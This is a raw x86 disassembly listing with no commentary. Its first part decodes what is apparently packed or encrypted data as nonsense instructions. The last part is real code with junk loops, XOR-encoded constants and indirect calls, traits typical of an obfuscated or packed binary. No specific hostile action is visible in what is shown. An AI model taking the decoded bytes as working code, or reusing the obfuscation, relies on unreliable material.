  4229cc:	fdiv   DWORD PTR [eax-0x34]
  4229cf:	pop    esp
  4229d0:	mov    esp,0xbae27fa2
  4229d5:	dec    esp
  4229d6:	bound  ecx,QWORD PTR [edi]
  4229d8:	mov    esp,0x9b78ad93
  4229dd:	out    0xb5,eax
  4229df:	imul   esi,DWORD PTR [edi+0x72],0xffffff91
  4229e3:	mov    edx,0xfb81b586
  4229e8:	sub    edi,ebx
  4229ea:	fldenv [esi+0x2fe6b2db]
  4229f0:	pop    eax
  4229f1:	mov    bh,0xed
  4229f3:	cmp    BYTE PTR [ebx],bl
  4229f5:	dec    edx
  4229f6:	push   DWORD PTR [edx-0x58712f97]
  4229fc:	(bad)  
  4229fe:	mov    edi,DWORD PTR [edi]
  422a00:	inc    edi
  422a01:	mov    DWORD PTR [ebp-0x4a],edi
  422a04:	jo     0x422988
  422a06:	add    BYTE PTR gs:[ebx+0x53a26efe],dl
  422a0d:	jae    0x4229ca
  422a0f:	std    
  422a10:	cmp    BYTE PTR [ebx+0x7f],ch
  422a13:	jg     0x422a19
  422a15:	in     al,0x59
  422a17:	mov    ecx,0x85c781b4
  422a1c:	call   0x5ba8:0x65725f56
  422a23:	ds xchg esp,eax
  422a25:	push   ebx
  422a26:	into   
  422a27:	push   0x6154974d
  422a2c:	pop    eax
  422a2d:	scas   al,BYTE PTR es:[edi]
  422a2e:	ja     0x422a2f
  422a30:	mov    esp,0xbf10f4ca
  422a35:	call   0x8abfa6a4
  422a3a:	lahf   
  422a3b:	adc    BYTE PTR [esi],0xfe
  422a3e:	jmp    0x422a10
  422a40:	jmp    FWORD PTR [eax+ecx*2+0x762f8e5a]
  422a47:	xor    ebp,ecx
  422a49:	xchg   esi,eax
  422a4a:	adc    dh,BYTE PTR [eax+0x74e4e304]
  422a50:	rcl    edx,cl
  422a52:	psrlq  mm2,QWORD PTR [ecx]
  422a55:	adc    ah,BYTE PTR [edx+ebp*2+0x488e5a1d]
  422a5c:	push   edi
  422a5d:	cs xchg edi,eax
  422a5f:	mov    esi,0x8f00ee45
  422a64:	and    al,0xda
  422a66:	jg     0x422a5e
  422a68:	mov    esp,0x579a201f
  422a6d:	in     al,0x4d
  422a6f:	shl    ecx,0x12
  422a72:	cld    
  422a73:	(bad)  
  422a74:	sbb    ecx,edi
  422a76:	ror    BYTE PTR [esi],0xb0
  422a79:	sub    DWORD PTR ds:0xa4e35506,edi
  422a7f:	xchg   ecx,eax
  422a80:	xor    eax,0xb231f1f0
  422a85:	in     eax,dx
  422a86:	fstp   TBYTE PTR [edx+0x13]
  422a89:	jno    0x422a29
  422a8b:	js     0x422a9f
  422a8d:	adc    BYTE PTR [edi],ah
  422a8f:	lahf   
  422a90:	out    0x88,al
  422a92:	or     eax,0x46fc1295
  422a97:	inc    esi
  422a98:	out    dx,eax
  422a99:	ins    DWORD PTR es:[edi],dx
  422a9a:	stos   DWORD PTR es:[edi],eax
  422a9b:	mov    esi,edx
  422a9d:	(bad)  
  422a9e:	imul   ecx,DWORD PTR [edx],0xffffffa7
  422aa1:	inc    ecx
  422aa2:	adc    eax,0x6d6a8bda
  422aa7:	(bad)  
  422aa8:	xchg   esp,eax
  422aa9:	jp     0x422a77
  422aab:	sbb    bl,0x1a
  422aae:	into   
  422aaf:	test   eax,0x18474911
  422ab4:	mov    ch,0x7d
  422ab6:	aaa    
  422ab7:	in     al,dx
  422ab8:	xchg   edx,eax
  422ab9:	and    eax,0x9bd1009b
  422abe:	push   esi
  422abf:	sub    esp,DWORD PTR [esi+0x105fe475]
  422ac5:	push   eax
  422ac6:	push   ecx
  422ac7:	imul   ebx,DWORD PTR [ebx],0x39cd3cfa
  422acd:	mov    fs,WORD PTR [ecx]
  422acf:	push   ecx
  422ad0:	push   ds
  422ad1:	xor    al,0xfa
  422ad3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ad4:	sub    al,0xa
  422ad6:	mov    ds:0x428885f5,eax
  422adb:	sar    DWORD PTR [ecx-0x40630a90],0xe7
  422ae2:	jns    0x422aa3
  422ae4:	call   0xa852:0x577aae32
  422aeb:	sbb    DWORD PTR ds:0x5494b1a5,ebx
  422af1:	mov    edx,esi
  422af3:	imul   ecx,DWORD PTR [edi],0xa9fd2b1e
  422af9:	mov    ?,WORD PTR [ecx+edi*4]
  422afc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422afd:	lods   al,BYTE PTR ds:[esi]
  422afe:	jmp    0x927e:0x69ee4237
  422b05:	mov    WORD PTR [edi-0x5548ae84],ds
  422b0b:	jmp    0xbdbf:0x79cb63c6
  422b12:	mov    al,0xfb
  422b14:	or     ebx,edx
  422b16:	inc    ebp
  422b17:	mov    eax,ds:0xa4a2ff12
  422b1c:	je     0x422b1b
  422b1e:	test   al,0x9e
  422b20:	push   ds
  422b21:	xchg   edi,eax
  422b22:	lahf   
  422b23:	call   0x67c4a6f6
  422b28:	rcr    ch,cl
  422b2a:	jge    0x422b40
  422b2c:	and    DWORD PTR [esi-0x2bdce97a],edi
  422b32:	add    ebp,eax
  422b34:	xor    dh,BYTE PTR [edx-0x2419cae7]
  422b3a:	mov    DWORD PTR [edx],esi
  422b3c:	ds pushf 
  422b3e:	dec    ah
  422b40:	imul   ebx,DWORD PTR [esi],0xffffffcf
  422b43:	sar    BYTE PTR cs:[edx+0x5aed3ab],cl
  422b4a:	mov    ecx,0xe376cc0e
  422b4f:	int    0x22
  422b51:	push   ebp
  422b52:	sahf   
  422b53:	xchg   ebp,eax
  422b54:	ror    DWORD PTR [esi-0x2858d50b],1
  422b5a:	jns    0x422ae5
  422b5c:	addr16 nop
  422b5e:	inc    eax
  422b5f:	out    dx,eax
  422b60:	dec    esi
  422b61:	inc    ebx
  422b62:	sub    DWORD PTR [edi-0x69],ebx
  422b65:	jb     0x422ae9
  422b67:	imul   ecx,DWORD PTR [eax+edx*8+0x2e70372e],0xaf15c077
  422b72:	push   ecx
  422b73:	sahf   
  422b74:	int    0x69
  422b76:	lods   al,BYTE PTR ds:[esi]
  422b77:	fwait
  422b78:	sub    eax,0xaf2ba7
  422b7d:	sbb    BYTE PTR [edi-0x5de35ea0],bl
  422b83:	inc    ecx
  422b84:	add    DWORD PTR [ecx-0x24],0xfd4a8cf6
  422b8b:	xor    DWORD PTR [ebx+0x2c],esp
  422b8e:	mov    ch,dl
  422b90:	cmc    
  422b91:	sbb    eax,0xd1ae1d7
  422b96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b97:	pop    es
  422b98:	jmp    0x3a6794d4
  422b9d:	call   0x128d:0x2e1f6e77
  422ba4:	mul    DWORD PTR [ebp+eiz*4+0x3b]
  422ba8:	mov    dh,0xe8
  422baa:	mov    DWORD PTR [ebx+0x0],0xa81d5a74
  422bb1:	call   0xc9e5914d
  422bb6:	mov    cl,BYTE PTR [edx+0x589a408f]
  422bbc:	arpl   WORD PTR [eax+esi*1],bx
  422bbf:	stos   BYTE PTR es:[edi],al
  422bc0:	out    dx,al
  422bc1:	cld    
  422bc2:	adc    al,0x1c
  422bc4:	dec    ebp
  422bc5:	data16 jns 0x422b4f
  422bc8:	and    ch,al
  422bca:	ins    DWORD PTR es:[edi],dx
  422bcb:	dec    ebp
  422bcc:	sub    ebx,DWORD PTR [ecx]
  422bce:	xchg   esp,eax
  422bcf:	loop   0x422c34
  422bd1:	pop    esp
  422bd2:	test   DWORD PTR [eax],eax
  422bd4:	loop   0x422c38
  422bd6:	mov    eax,ebx
  422bd8:	fistp  DWORD PTR [edx]
  422bda:	scas   eax,DWORD PTR es:[edi]
  422bdb:	cmp    esp,edx
  422bdd:	sub    al,BYTE PTR ds:0x1de356c8
  422be3:	sub    esi,edi
  422be5:	ja     0x422bcd
  422be7:	adc    BYTE PTR [esi+eax*1],bl
  422bea:	sub    al,0x50
  422bec:	mov    al,0x28
  422bee:	(bad)  [ebx-0x2e62d578]
  422bf4:	in     eax,dx
  422bf5:	scas   al,BYTE PTR es:[edi]
  422bf6:	cs mov ch,0x13
  422bf9:	arpl   WORD PTR [edi+0x34],bp
  422bfc:	dec    edi
  422bfd:	rcl    DWORD PTR [ecx+eiz*1-0x1e],0x4f
  422c02:	jl     0x422c64
  422c04:	fmul   QWORD PTR [edx+0xedb7769]
  422c0a:	or     DWORD PTR [ebp+edi*8-0x14],ecx
  422c0e:	and    BYTE PTR [eax+0x1e94992b],dh
  422c14:	inc    DWORD PTR ds:0x4a844920
  422c1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422c1b:	or     al,0xc
  422c1d:	(bad)  
  422c1e:	rcl    DWORD PTR [edx-0x3e],0x30
  422c22:	scas   al,BYTE PTR es:[edi]
  422c23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422c24:	imul   esp,DWORD PTR [ebp+0x159e6e10],0x51a3e88f
  422c2e:	lods   eax,DWORD PTR ds:[esi]
  422c2f:	dec    ebx
  422c30:	call   0xb3f1:0xa0bb777b
  422c37:	push   esi
  422c38:	int    0xa6
  422c3a:	add    edx,DWORD PTR [edi+0x36]
  422c3d:	into   
  422c3e:	mov    eax,ds:0xbc03cda7
  422c43:	push   es
  422c44:	es mov cl,0x4a
  422c47:	mov    ebx,0x40cbbf1c
  422c4c:	clc    
  422c4d:	push   edi
  422c4e:	add    eax,DWORD PTR [edx+esi*1-0x72]
  422c52:	out    0x7d,al
  422c54:	out    dx,al
  422c55:	ficom  WORD PTR [ebx+0x7]
  422c58:	pop    ds
  422c59:	addr16 jbe 0x422c6d
  422c5c:	sub    bh,BYTE PTR [edi+0x45]
  422c5f:	jge    0x422c55
  422c61:	mov    dl,0xb9
  422c63:	bound  esi,QWORD PTR [edx+0x555658e3]
  422c69:	mov    ds:0x5b3a1b28,al
  422c6e:	sar    DWORD PTR [edx-0x5379f242],cl
  422c74:	dec    ebx
  422c75:	stc    
  422c76:	sbb    dh,BYTE PTR [ebx-0x15]
  422c79:	rcl    BYTE PTR [ebp-0x71fdf9b0],1
  422c7f:	mov    bl,BYTE PTR [edx+esi*2-0x6c9ab86d]
  422c86:	pop    es
  422c87:	and    edi,DWORD PTR [ecx]
  422c89:	in     al,0x3f
  422c8b:	mov    ebp,gs
  422c8d:	out    dx,eax
  422c8e:	xchg   ebp,eax
  422c8f:	(bad)  
  422c90:	fstp   QWORD PTR [esi]
  422c92:	imul   ebx,DWORD PTR [ecx],0x65
  422c95:	xor    dh,BYTE PTR [ebp+0x6c92f02f]
  422c9b:	xchg   ecx,eax
  422c9c:	test   DWORD PTR [eax],0x2a3f1c46
  422ca2:	mov    bl,0x20
  422ca4:	sub    al,0x6b
  422ca6:	pusha  
  422ca7:	scas   al,BYTE PTR es:[edi]
  422ca8:	arpl   WORD PTR [edi+ebx*4+0x26],bx
  422cac:	inc    ebx
  422cad:	adc    al,0xc7
  422caf:	(bad)  [ecx]
  422cb1:	std    
  422cb2:	fldcw  WORD PTR [esi+0x47]
  422cb5:	pusha  
  422cb6:	inc    edi
  422cb7:	and    esi,DWORD PTR gs:[edx]
  422cba:	mov    WORD PTR [edi],es
  422cbc:	in     al,0xf9
  422cbe:	jae    0x422d38
  422cc0:	sti    
  422cc1:	cmp    eax,0xfa6681d2
  422cc6:	hlt    
  422cc7:	in     al,dx
  422cc8:	and    al,0x3b
  422cca:	sti    
  422ccb:	call   0xa70c:0x7906bc9
  422cd2:	std    
  422cd3:	int3   
  422cd4:	mov    esi,0x499b0aa8
  422cd9:	add    eax,0x1f625095
  422cde:	repz push ebx
  422ce0:	test   dl,al
  422ce2:	fist   DWORD PTR [edx]
  422ce4:	push   es
  422ce5:	push   esp
  422ce6:	sub    eax,esp
  422ce8:	cs jle 0x422ccc
  422ceb:	fsubr  QWORD PTR [ebx-0x50]
  422cee:	or     bh,BYTE PTR [edi-0x78]
  422cf1:	mov    al,0x27
  422cf3:	push   0x2811748
  422cf8:	mov    ebx,0x11893ed2
  422cfd:	jne    0x422cba
  422cff:	cmp    esi,DWORD PTR [ecx-0x43]
  422d02:	out    0xc2,eax
  422d04:	sbb    al,0xf2
  422d06:	in     eax,0x21
  422d08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422d09:	out    0x5d,al
  422d0b:	test   al,0x1e
  422d0d:	and    BYTE PTR [eax-0x14],0x40
  422d11:	fwait
  422d12:	mov    esp,0x800ab
  422d17:	mov    dl,0xb
  422d19:	aam    0x1b
  422d1b:	mov    eax,ds:0x1c044960
  422d20:	jle    0x422d2f
  422d22:	adc    DWORD PTR [esi+0x55],ebp
  422d25:	pop    ds
  422d26:	xchg   ebx,eax
  422d27:	dec    edx
  422d28:	icebp  
  422d29:	fidivr DWORD PTR [ebx+0x1715cea4]
  422d2f:	loope  0x422cd1
  422d31:	cmp    edx,DWORD PTR [ecx]
  422d33:	cmp    esp,0x958ab36e
  422d39:	mov    ds:0x89398384,eax
  422d3e:	call   0xa215:0x1e90ae2
  422d45:	or     al,0x2a
  422d47:	sbb    cl,BYTE PTR [ebx]
  422d49:	adc    DWORD PTR [esp+ebp*8+0x7ffa6f27],esp
  422d50:	xchg   esp,eax
  422d51:	sub    DWORD PTR [edx-0x60d66389],0xc60cf38f
  422d5b:	mov    ebp,DWORD PTR [edi-0x15]
  422d5e:	xchg   ebp,eax
  422d5f:	int3   
  422d60:	jnp    0x422daf
  422d62:	jnp    0x422d9a
  422d64:	lods   al,BYTE PTR cs:[esi]
  422d66:	mov    ds:0xe4adb2bb,al
  422d6b:	dec    edi
  422d6c:	cwde   
  422d6d:	pop    ebp
  422d6e:	sub    ebp,DWORD PTR [esi+0x3e]
  422d71:	fsubr  QWORD PTR [esi-0x19]
  422d74:	push   cs
  422d75:	daa    
  422d76:	push   cs
  422d77:	stos   DWORD PTR es:[edi],eax
  422d78:	leave  
  422d79:	cmp    al,0x2d
  422d7b:	sbb    ch,BYTE PTR [ecx-0x6997ca33]
  422d81:	outs   dx,BYTE PTR ds:[esi]
  422d82:	mov    bl,0x5f
  422d84:	ds pop ss
  422d86:	dec    ebx
  422d87:	mov    ebp,0x59f2fc4d
  422d8c:	jmp    0xc397d915
  422d91:	sub    dl,BYTE PTR [ebx-0x483895e9]
  422d97:	nop
  422d98:	xor    ch,ch
  422d9a:	lods   al,BYTE PTR ds:[esi]
  422d9b:	inc    esp
  422d9c:	sbb    al,0xc8
  422d9e:	jmp    0x62:0xc321384f
  422da5:	push   esi
  422da6:	add    DWORD PTR [edi+0x770f2896],esi
  422dac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422dad:	outs   dx,BYTE PTR ds:[esi]
  422dae:	push   eax
  422daf:	in     eax,dx
  422db0:	add    ah,cl
  422db2:	addr16 xchg edi,eax
  422db4:	scas   al,BYTE PTR es:[edi]
  422db5:	(bad)  
  422db6:	jns    0x422d7a
  422db8:	popf   
  422db9:	inc    esp
  422dba:	popa   
  422dbb:	outs   dx,BYTE PTR ds:[esi]
  422dbc:	dec    ecx
  422dbd:	mov    al,ds:0x5ceba5ce
  422dc2:	add    dl,ch
  422dc4:	sub    al,0x46
  422dc6:	ret    
  422dc7:	xor    DWORD PTR [edx],eax
  422dc9:	mov    esi,0xb6c56ac0
  422dce:	inc    edx
  422dcf:	sub    bh,BYTE PTR [ebx]
  422dd1:	xchg   DWORD PTR [esi+ebx*1+0x34b5ba95],ecx
  422dd8:	inc    ebx
  422dd9:	ror    BYTE PTR [edx+0x2dc9b61c],0x85
  422de0:	dec    esi
  422de1:	inc    edx
  422de2:	push   ecx
  422de3:	test   eax,0xde6b95c0
  422de8:	dec    ecx
  422de9:	test   al,0x79
  422deb:	fwait
  422dec:	add    ecx,DWORD PTR [ebx]
  422dee:	pop    es
  422def:	pop    ds
  422df0:	sbb    eax,0x429e9ed
  422df5:	ret    0x2737
  422df8:	xchg   edx,eax
  422df9:	jg     0x422e79
  422dfb:	in     eax,0xa8
  422dfd:	cmp    bl,BYTE PTR [edi-0x4eda0dd2]
  422e03:	mov    al,ds:0x5ec7233d
  422e08:	sub    eax,0xbc62a62e
  422e0d:	jnp    0x422e57
  422e0f:	sar    DWORD PTR [ebx*1-0x78689d58],cl
  422e16:	aas    
  422e17:	not    BYTE PTR [ecx-0x24]
  422e1a:	mov    edx,0xf76d29b3
  422e1f:	mov    cl,BYTE PTR [ecx-0x79]
  422e22:	ss inc eax
  422e24:	test   eax,0x3acaa62
  422e29:	jg     0x422e05
  422e2b:	dec    BYTE PTR [esi+eiz*8+0x6e]
  422e2f:	frstor [ecx]
  422e31:	clc    
  422e32:	adc    ebx,ebp
  422e34:	pusha  
  422e35:	push   ss
  422e36:	ss dec edi
  422e38:	test   BYTE PTR [edi],dh
  422e3a:	sub    BYTE PTR [esi-0x3b],al
  422e3d:	sub    bl,BYTE PTR ds:0xaa222b5d
  422e43:	mov    ecx,0xba8f2294
  422e48:	test   DWORD PTR [ecx+0x7d],ebp
  422e4b:	hlt    
  422e4c:	add    eax,0xca5189eb
  422e51:	sbb    al,BYTE PTR [edi-0x6b20e42a]
  422e57:	xor    DWORD PTR [edx+0x1a],0xfcdc871b
  422e5e:	pop    ecx
  422e5f:	arpl   WORD PTR [ebp+0x6da52514],sp
  422e65:	shr    BYTE PTR [eax+0x4eafb805],1
  422e6b:	or     al,0x25
  422e6d:	pop    ss
  422e6e:	mov    esi,DWORD PTR [ecx+0x14]
  422e71:	ror    ebx,cl
  422e73:	mov    eax,0x7144ed40
  422e78:	das    
  422e79:	ret    0x3683
  422e7c:	sbb    DWORD PTR [ebp-0x7ca29055],eax
  422e82:	stos   DWORD PTR es:[edi],eax
  422e83:	sub    DWORD PTR [ecx],ebx
  422e85:	push   ds
  422e86:	adc    al,0xb3
  422e88:	xor    DWORD PTR [esi+0x79be4e70],0x5a
  422e8f:	sbb    DWORD PTR [edi-0x73],edi
  422e92:	cmp    ecx,edi
  422e94:	add    ebp,eax
  422e96:	xchg   ebp,eax
  422e97:	or     ch,BYTE PTR [eax+0x1fa58c4c]
  422e9d:	fst    DWORD PTR [eax-0x2ccadb12]
  422ea3:	int3   
  422ea4:	mov    dh,0xb
  422ea6:	mov    eax,0x8c0bb6a
  422eab:	jl     0x422e70
  422ead:	fst    QWORD PTR [edi+0x5e]
  422eb0:	(bad)  
  422eb1:	cmp    al,bh
  422eb3:	pop    ebx
  422eb4:	ret    
  422eb5:	dec    esp
  422eb6:	mov    dl,0x3a
  422eb8:	call   0x94d2:0x115a1651
  422ebf:	inc    esp
  422ec0:	stc    
  422ec1:	pop    ds
  422ec2:	xor    BYTE PTR [ecx-0x7796c3e2],bh
  422ec8:	sbb    DWORD PTR ds:0xc92809b3,eax
  422ece:	sub    al,0x2a
  422ed0:	mov    bl,0xbc
  422ed2:	add    DWORD PTR [edi-0x6f2ce964],esi
  422ed8:	pop    esp
  422ed9:	xor    ebx,DWORD PTR [ecx+ebp*8-0x68f95fc5]
  422ee0:	jne    0x422eb2
  422ee2:	or     bl,al
  422ee4:	popf   
  422ee5:	sbb    al,0x1c
  422ee7:	pop    ds
  422ee8:	icebp  
  422ee9:	std    
  422eea:	pop    ecx
  422eeb:	inc    ebp
  422eec:	push   ecx
  422eed:	and    BYTE PTR [ebx],ah
  422eef:	scas   al,BYTE PTR es:[edi]
  422ef0:	mov    cs,WORD PTR [eax-0x3]
  422ef3:	or     BYTE PTR gs:[si-0x5d],cl
  422ef8:	enter  0x6aa8,0x73
  422efc:	mov    eax,0xdb7f8666
  422f01:	xor    esp,DWORD PTR [esi+0x6433cffb]
  422f07:	das    
  422f08:	cmp    BYTE PTR [edx-0x6ee4d040],bl
  422f0e:	outs   dx,DWORD PTR gs:[esi]
  422f10:	pop    eax
  422f11:	loop   0x422f74
  422f13:	stos   DWORD PTR es:[edi],eax
  422f14:	push   es
  422f15:	and    al,0xab
  422f17:	lock lahf 
  422f19:	fs mov esp,0x31c114b9
  422f1f:	fidivr DWORD PTR [esi-0x74]
  422f22:	push   ebx
  422f23:	push   esi
  422f24:	imul   ecx,edi,0x75
  422f27:	nop
  422f28:	ror    DWORD PTR [ecx+0x42],0x8
  422f2c:	cmc    
  422f2d:	int    0x2e
  422f2f:	jmp    FWORD PTR [edx+0x37bd34ee]
  422f35:	xchg   esi,eax
  422f36:	idiv   BYTE PTR ds:0x5325a4f1
  422f3c:	cmp    dh,0xd9
  422f3f:	inc    ebx
  422f40:	cdq    
  422f41:	bound  edi,QWORD PTR [edx+0x51]
  422f44:	sar    BYTE PTR [eax+ebx*1+0x65],0x51
  422f49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f4a:	mov    ebp,0x62f8e0e7
  422f4f:	jg     0x422fb6
  422f51:	lods   al,BYTE PTR ds:[esi]
  422f52:	adc    BYTE PTR [ebx],0x7c
  422f55:	add    ecx,edi
  422f57:	and    ecx,edx
  422f59:	mov    DWORD PTR [ebp-0x4c],ecx
  422f5c:	mov    ecx,DWORD PTR [ebp+0x8]
  422f5f:	mov    edx,DWORD PTR [ebp-0x48]
  422f62:	lea    ecx,[edx+ecx*1+0x241fcdf]
  422f69:	mov    DWORD PTR [ebp-0x48],ecx
  422f6c:	mov    ecx,DWORD PTR [ebp+0x8]
  422f6f:	mov    edx,0xfa5e1524
  422f74:	sub    edx,ecx
  422f76:	add    edx,DWORD PTR [ebp-0x44]
  422f79:	mov    DWORD PTR [ebp-0x44],edx
  422f7c:	mov    ecx,DWORD PTR [ebp+0x8]
  422f7f:	xor    ecx,eax
  422f81:	add    ecx,esi
  422f83:	jne    0x421ef2
  422f89:	mov    ecx,DWORD PTR [ebp-0x8]
  422f8c:	xor    ecx,eax
  422f8e:	mov    eax,DWORD PTR [ebp+0x10]
  422f91:	add    ecx,esi
  422f93:	mov    DWORD PTR [eax],ecx
  422f95:	pop    edi
  422f96:	pop    esi
  422f97:	pop    ebx
  422f98:	leave  
  422f99:	ret    0xc
  422f9c:	push   ebp
  422f9d:	mov    ebp,esp
  422f9f:	sub    esp,0x78
  422fa2:	and    DWORD PTR ds:0x42a2e2,0x0
  422fac:	jmp    0x422fbe
  422fb1:	mov    ecx,DWORD PTR ds:0x42a2e2
  422fb7:	inc    ecx
  422fb8:	mov    DWORD PTR ds:0x42a2e2,ecx
  422fbe:	cmp    DWORD PTR ds:0x42a2e2,0x17
  422fc5:	jae    0x423012
  422fcb:	cmp    DWORD PTR ds:0x42a2e2,0xb
  422fd2:	jbe    0x423012
  422fd8:	jmp    0x422ff3
  422fdd:	push   DWORD PTR [ebp-0x14]
  422fe0:	push   0x42a2be
  422fe5:	push   0x8b21
  422fea:	push   DWORD PTR [ebp-0x1c]
  422fed:	call   DWORD PTR ds:0x42a3d2
  422ff3:	cmp    DWORD PTR ds:0x42a2e2,0xa
  422ffa:	jne    0x42300d
  423000:	mov    ecx,DWORD PTR ds:0x42a2e2
  423006:	inc    ecx
  423007:	mov    DWORD PTR ds:0x42a2e2,ecx
  42300d:	jmp    0x422fb1
  423012:	push   esi
  423013:	sbb    DWORD PTR ds:0x42a26e,edx
  423019:	push   edi
  42301a:	adc    esi,eax
  42301c:	mov    eax,ds:0x42941e
  423021:	inc    DWORD PTR ds:0x42a2ae
  423027:	mov    DWORD PTR [ebp-0x24],eax
  42302a:	mov    DWORD PTR ds:0x42a286,0x12e2
  423034:	mov    eax,ds:0x42953e
  423039:	inc    ecx
  42303a:	mov    DWORD PTR [ebp-0x30],eax
  42303d:	mov    DWORD PTR ds:0x42a29e,0x10
  423047:	cmp    DWORD PTR ds:0x42a29e,0x0
  42304e:	je     0x4230b0
  423054:	cmp    DWORD PTR ds:0x42a29e,0x9
  42305b:	jbe    0x4230b0
  423061:	jmp    0x423085
  423066:	push   DWORD PTR [ebp-0x24]
  423069:	push   DWORD PTR [ebp-0x18]
  42306c:	push   DWORD PTR [ebp-0xc]
  42306f:	push   0x10f9
  423074:	push   DWORD PTR [ebp-0x28]
  423077:	push   DWORD PTR [ebp-0x18]
  42307a:	push   0x429211
  42307f:	call   DWORD PTR ds:0x42a3d6
  423085:	cmp    DWORD PTR ds:0x42a29e,0xa
  42308c:	jne    0x4230a0
  423092:	xor    eax,eax
  423094:	xor    eax,DWORD PTR ds:0x42a29e
  42309a:	dec    eax
  42309b:	mov    ds:0x42a29e,eax
  4230a0:	mov    eax,ds:0x42a29e
  4230a5:	dec    eax
  4230a6:	mov    ds:0x42a29e,eax
  4230ab:	jmp    0x423047
  4230b0:	mov    DWORD PTR [ebp-0x2c],0xf89c85a5
  4230b7:	mov    DWORD PTR ds:0x42a26a,0x16
  4230c1:	cmp    DWORD PTR ds:0x42a26a,0x0
  4230c8:	je     0x4230fa
  4230ce:	cmp    DWORD PTR ds:0x42a26a,0x20
  4230d5:	jg     0x4230fa
  4230db:	jmp    0x4230e6
  4230e0:	call   DWORD PTR ds:0x42a3da
  4230e6:	xor    edi,edi
  4230e8:	add    edi,DWORD PTR ds:0x42a26a
  4230ee:	dec    edi
  4230ef:	mov    DWORD PTR ds:0x42a26a,edi
  4230f5:	jmp    0x4230c1
  4230fa:	mov    DWORD PTR [ebp-0x28],0xf89c85ba
  423101:	mov    eax,DWORD PTR [ebp-0x10]
  423104:	mov    ecx,DWORD PTR [ebp-0x10]
  423107:	xor    esi,esi
  423109:	xor    esi,DWORD PTR ds:0x42a286
  42310f:	xor    DWORD PTR ds:0x42a2f6,esi
  423115:	sub    eax,ecx
  423117:	or     ecx,esi
  423119:	mov    DWORD PTR [ebp-0x10],eax
  42311c:	xor    DWORD PTR [ebp-0x10],0xf89cb5a5
  423123:	add    DWORD PTR ds:0x42a26a,0x2e29
  42312d:	mov    eax,DWORD PTR [ebp-0x18]
  423130:	sbb    DWORD PTR ds:0x42a272,0x6ecf
  42313a:	mov    ecx,DWORD PTR [ebp-0x18]
  42313d:	add    DWORD PTR ds:0x42a256,0x42a29a
  423147:	sub    eax,ecx
  423149:	adc    DWORD PTR ds:0x42a302,edi
  42314f:	mov    DWORD PTR [ebp-0x18],eax
  423152:	add    DWORD PTR ds:0x42a2fe,ecx
  423158:	or     DWORD PTR [ebp-0x18],0xf89f05a5
  42315f:	adc    DWORD PTR ds:0x42a26a,0x287e
  423169:	mov    eax,DWORD PTR [ebp-0xc]
  42316c:	adc    esi,esi
  42316e:	mov    ecx,DWORD PTR [ebp-0xc]
  423171:	sub    eax,ecx
  423173:	xor    DWORD PTR ds:0x42a2b6,0x51ed
  42317d:	mov    DWORD PTR [ebp-0xc],eax
  423180:	and    DWORD PTR ds:0x42a2ae,0x0
  42318a:	mov    edi,DWORD PTR ds:0x42a2ae
  423190:	inc    edi
  423191:	mov    DWORD PTR ds:0x42a2ae,edi
  423197:	cmp    DWORD PTR ds:0x42a2ae,0xd
  42319e:	ja     0x4231e8
  4231a4:	jmp    0x4231bf
  4231a9:	push   DWORD PTR [ebp-0x1c]
  4231ac:	push   0x7962
  4231b1:	push   0x7f76
  4231b6:	push   DWORD PTR [ebp-0x20]
  4231b9:	call   DWORD PTR ds:0x42a3de
  4231bf:	cmp    DWORD PTR ds:0x42a2ae,0xc
  4231c6:	jne    0x4231db
  4231cc:	xor    edi,edi
  4231ce:	xor    edi,DWORD PTR ds:0x42a2ae
  4231d4:	inc    edi
  4231d5:	mov    DWORD PTR ds:0x42a2ae,edi
  4231db:	cmp    DWORD PTR ds:0x42a2ae,0x18
  4231e2:	jb     0x42318a
  4231e8:	or     DWORD PTR [ebp-0xc],0xf89c85e5
  4231ef:	adc    esi,edi
  4231f1:	mov    eax,DWORD PTR [ebp-0x1c]
  4231f4:	mov    ecx,DWORD PTR [ebp-0x1c]
  4231f7:	sub    eax,ecx
  4231f9:	mov    DWORD PTR [ebp-0x1c],eax
  4231fc:	or     DWORD PTR [ebp-0x1c],0xf89c8585
  423203:	mov    eax,DWORD PTR [ebp-0x20]
  423206:	mov    ecx,DWORD PTR [ebp-0x20]
  423209:	sub    eax,ecx
  42320b:	mov    DWORD PTR [ebp-0x20],eax
  42320e:	mov    eax,DWORD PTR [ebp-0x2c]
  423211:	mov    ecx,DWORD PTR [ebp-0x20]
  423214:	mov    esi,0x75108aa
  423219:	xor    eax,esi
  42321b:	mov    edi,0x3272f1
  423220:	add    eax,edi
  423222:	or     eax,ecx
  423224:	mov    DWORD PTR [ebp-0x20],eax
  423227:	mov    eax,DWORD PTR [ebp-0x4]
  42322a:	mov    ecx,DWORD PTR [ebp-0x4]
  42322d:	sub    eax,ecx
  42322f:	mov    DWORD PTR [ebp-0x4],eax
  423232:	or     DWORD PTR [ebp-0x4],0xf89c85be
  423239:	mov    eax,DWORD PTR [ebp-0xc]
  42323c:	xor    eax,esi
  42323e:	add    eax,edi
  423240:	push   eax
  423241:	mov    eax,DWORD PTR [ebp-0x10]
  423244:	xor    eax,esi
  423246:	add    eax,edi
  423248:	push   eax
  423249:	mov    eax,DWORD PTR [ebp-0x4]
  42324c:	xor    eax,esi
  42324e:	add    eax,edi
  423250:	push   eax
  423251:	lea    eax,[ebp-0x78]
  423254:	push   eax
  423255:	push   DWORD PTR [ebp-0x2c]
  423258:	push   DWORD PTR [ebp-0x28]
  42325b:	call   0x413da8
  423260:	test   eax,eax
  423262:	je     0x423290
  423268:	lea    eax,[ebp-0x78]
  42326b:	push   eax
  42326c:	mov    eax,DWORD PTR [ebp-0x28]
  42326f:	xor    eax,esi
  423271:	add    eax,edi
  423273:	push   eax
  423274:	mov    eax,DWORD PTR [ebp-0x24]
  423277:	add    eax,0xaa
  42327c:	push   eax
  42327d:	mov    eax,DWORD PTR [ebp-0x24]
  423280:	mov    eax,DWORD PTR [eax+0x198]
  423286:	push   DWORD PTR [eax]
  423288:	call   0x4084f6
  42328d:	mov    DWORD PTR [ebp-0x14],eax
  423290:	mov    ecx,DWORD PTR ds:0x429516
